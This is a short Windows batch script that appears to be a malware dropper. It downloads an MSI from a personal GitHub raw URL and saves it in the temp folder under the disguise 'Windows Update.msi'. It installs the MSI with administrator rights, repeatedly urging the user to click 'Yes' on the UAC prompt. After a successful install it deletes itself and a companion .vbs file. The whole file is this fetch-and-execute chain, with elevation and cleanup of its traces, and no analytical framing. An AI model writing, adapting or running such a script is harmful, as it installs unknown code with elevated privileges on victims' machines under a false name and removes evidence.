@echo off
setlocal enabledelayedexpansion

:: Set download URL and paths
set "url=https://raw.githubusercontent.com/kevin64848/filesnew/refs/heads/main/file44.msi"
set "outputFileName=Windows Update.msi"
set "outputFilePath=%TEMP%\%outputFileName%"
set "self=%~f0"
set "vbsFile=%~dp0file44.vbs"

:: Debug - show current paths
echo Self path: %self%
echo VBS path: %vbsFile%
echo Download path: %outputFilePath%
echo.

:: Delete existing file if any
if exist "%outputFilePath%" (
    echo Deleting existing file...
    del /f /q "%outputFilePath%"
)

echo Downloading MSI from %url% ...
powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing; Write-Host 'Download completed' } catch { Write-Host 'Download failed:' $_.Exception.Message; exit 1 }"

if not exist "%outputFilePath%" (
    echo Download failed. File not found.
    pause
    exit /b 1
)

echo Download successful. File size: 
dir "%outputFilePath%" | findstr "Windows Update"

:RunLoop
set attempt=0
echo.
echo Attempting to run MSI installer...

powershell -Command "$p = Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qb' -Verb runAs -PassThru -ErrorAction SilentlyContinue; if ($p) { Write-Host 'Process started with ID:' $p.Id; $p.WaitForExit(); Write-Host 'Exit code:' $p.ExitCode; exit $p.ExitCode } else { Write-Host 'Failed to start process'; exit 1 }"

echo PowerShell exit code: %ERRORLEVEL%

if %ERRORLEVEL%==0 (
    echo Installation completed successfully.
    
    echo Deleting files in 4 seconds...
    timeout /t 4 /nobreak >nul
    
    echo Deleting: %self%
    del /f /q "%self%" 2>nul
    
    echo Deleting: %vbsFile%
    if exist "%vbsFile%" del /f /q "%vbsFile%" 2>nul
    
    echo Cleanup complete.
    exit /b 0
)

echo.
echo [!] Installation failed or UAC was denied.
set /a attempt+=1
if !attempt! geq 3 (
    echo Too many failed attempts. Exiting.
    pause
    exit /b 1
)
echo Please click "Yes" on the UAC prompt.
timeout /t 3 /nobreak >nul
goto RunLoop
